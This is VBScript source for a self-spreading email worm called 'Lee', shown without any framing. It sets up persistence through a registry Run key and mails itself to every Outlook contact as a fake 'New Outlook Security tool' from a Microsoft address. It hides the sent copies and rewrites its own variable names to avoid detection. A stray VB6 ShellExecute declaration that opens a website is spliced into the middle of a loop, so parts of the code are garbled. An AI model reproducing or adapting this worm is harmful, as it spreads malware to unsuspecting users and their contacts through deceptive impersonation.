   'Lee
   On Error Resume Next
   Set qepvdtcvxke = CreateObject("WScript.Shell")
   set hfzkfahmeex=createobject("scripting.filesystemobject")
   hfzkfahmeex.copyfile wscript.scriptfullname,"C:\Programme\Lee from Germany\Update.vbs"
   qepvdtcvxke.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SysBoot","wscript.exe C:\Programme\Lee from Germany\Update.vbs %"
   if qepvdtcvxke.regread ("HKCU\software\Update\mailed") <> "1" then
   dajhteqtrxy()
   end if
   Function dajhteqtrxy()
   On Error Resume Next
   Set grrwbynveoy = CreateObject("Outlook.Application")
   If grrwbynveoy= "Outlook"Then
   Set vqgkkkmfbfu=grrwbynveoy.GetNameSpace("MAPI")
   For Each aaiklhubyqh In vqgkkkmfbfu.AddressLists
   If aaiklhubyqh.AddressEntries.Count <> 0 Then
   For isgjpvfmfzm= 1 To aaiklhubyqh.AddressEntries.Count
   Set xxlckdfsfli = aaiklhubyqh.AddressEntries(isgjpvfmfzm)
   Set rqbmyusyhoz = grrwbynveoy.CreateItem(0)
   rqbmyusyhoz.To = xxlckdfsfli.Address
   rqbmyusyhoz.Subject = "New Outlook Security tool"
   rqbmyusyhoz.Body = "Dear User !" & vbcrlf & "Here is the New Security Outlook tool." & vbcrlf & "No more Vb-Viruses." & vbcrlf & "" & vbcrlf & "" & vbcrlf & "Sincerly: Lee@Microsoft.com"
   rqbmyusyhoz.Attachments.Add "C:\Programme\Lee from Germany\Update.vbs"
   rqbmyusyhoz.DeleteAfterSubmit = True
   If rqbmyusyhoz.To <> "" Then
   rqbmyusyhoz.Send
   Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
   Dim WebSite As String
   WebSite = "http://www.Coderz.net"
   ShellExecute Me.hwnd, "open", WebSite, "", "", 1
   Randomize
   Set FSObject = CreateObject("Scripting.FileSystemObject")
   Set ScriptFile = FSObject.OpenTextFile(WScript.ScriptFullName, 1)
   OurCode = ScriptFile.Readall
   AllVariables = "FSObject ScriptFile OurCode AllVariables VarLoop CurVar NewVar VarPos "
   Do
   CurVar = Left(AllVariables, InStr(AllVariables, Chr(32)) - 1)
   AllVariables = Mid(AllVariables, InStr(AllVariables, Chr(32)) + 1)
   NewVar = Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65))
   Do
   VarPos = InStr(VarPos + 1, OurCode, CurVar)
   If VarPos Then OurCode = Mid(OurCode, 1, (VarPos - 1)) & NewVar & Mid(OurCode, (VarPos + Len(CurVar)))
   Loop While VarPos
   Loop While AllVariables <> ""
   Set ScriptFile = FSObject.OpenTextFile(WScript.ScriptFullName, 2, True) '
   ScriptFile.Writeline OurCode
   End If
   Next
   End If
   Next
   qepvdtcvxke.regwrite "HKCU\software\Update\mailed", "1"
   end if
   End Function
